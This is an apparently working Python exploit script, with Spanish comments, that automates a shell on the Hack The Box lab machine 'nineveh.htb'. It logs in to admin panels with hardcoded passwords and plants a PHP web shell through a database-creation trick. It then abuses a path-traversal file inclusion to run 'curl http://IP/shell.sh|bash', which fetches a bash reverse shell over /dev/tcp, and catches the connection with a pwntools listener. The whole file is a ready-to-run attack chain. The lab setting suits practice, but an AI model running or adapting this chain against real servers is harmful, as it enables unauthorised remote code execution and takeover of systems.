#!/usr/bin/env python3

#Crearos un archivo llamado shell.sh que contenga "#!/bin/bash\n\n bash -i >& /dev/tcp/IP/443 0>&1" y le dais permisos de ejecucion "chmod +x shell.sh"
#Cambiar la IP de variables globales 
#Agregar al /etc/hosts el dominio nineveh.htb

from pwn import *
import sys
import time
import threading
import requests
import urllib3
import subprocess

signal.signal(signal.SIGINT, signal.SIG_DFL)

#Variables globales
IP = "10.10.16.198" # <= cambiar!
url_main = "https://nineveh.htb/db/index.php"
url_create_table = "https://nineveh.htb/db/index.php?action=table_create&confirm=1"
url_LFI = "http://nineveh.htb/department/manage.php?notes=files/ninevehNotes../../../../../../../var/tmp/hack.php&cmd=curl http://%s/shell.sh|bash" %IP
url_login2 = "http://nineveh.htb/department/login.php"
lport = 443



#Funciones
def obtainShell():

    try:
        urllib3.disable_warnings()
        s = requests.Session()
        s.verify = False
        s.keep_alive = False
        login_data = {
            'password' : 'password123',
            'remember' : 'yes',
            'login' : 'Log+In',
            'proc_login' : 'true'
        }
        r = s.post(url_main, data=login_data)
        p1 = log.progress("Iniciando Sesion como Admin:password123")
        cookie_data = {
            'pla3412' : 'password123',
            'pla3412_salt' : '0',
            'PHPSESSID' : '6mg8bpr1556fhre675t44ptsg7'
        }
        create_db_data = {
            'new_dbname'  : 'hack.php'
        }
        p2 = log.progress("\n[*]Se ha agregado una base de datos: hack.php\n")
        r = s.post(url_main, cookies=cookie_data, data=create_db_data)
        create_table_data = {
            'tablename' : 'shell',
            'rows' : '1',
            '0_field' : '<?php system($_REQUEST["cmd"]); ?>',
            '0_type' : 'TEXT',
            '0_defaultvalue' : ''
        }
        r = s.post(url_create_table, cookies=cookie_data, data=create_table_data)
        p3 = log.progress("\nSe ha agregado una nueva tabla a la base de datos con el payload\n")
        time.sleep(1)
        p3.status("\nIniciando sesion como admin:1q2w3e4r5t\n")
        time.sleep(1)
        s = requests.Session()
        login_data2 = {
            'username' : 'admin',
            'password' : '1q2w3e4r5t'
        }
        r = s.post(url_login2, data=login_data2)
        p4 = log.progress("[*]Montando servidor con Python para ejecutar shell.sh")
        subprocess.Popen(["timeout", "5", "python3", "-m", "http.server", "80"])
        time.sleep(2)
        cookie_data2 = {
            'PHPSESSID' : '6mg8bpr1556fhre675t44ptsg7'
        }
        r = s.get(url_LFI, cookies=cookie_data2)
        
    except requests.exceptions.ReadTimeout:
        p3.success("Payload enviado con exito!")
        sys.exit(1)

    except Exception as e:
            print(e)


if __name__ == '__main__':
    try:
        threading.Thread(target=obtainShell).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=10).wait_for_connection()

    if shell.sock is None:
        log.failure("No se ha obtenido conexion")
        sys.exit()
    else:
        log.success("\n ✔️  Se ha obtenido una shell ✔️ \n")
        time.sleep(1)
        log.info("\nAcceso como www-data\n")
        time.sleep(1)

    shell.interactive()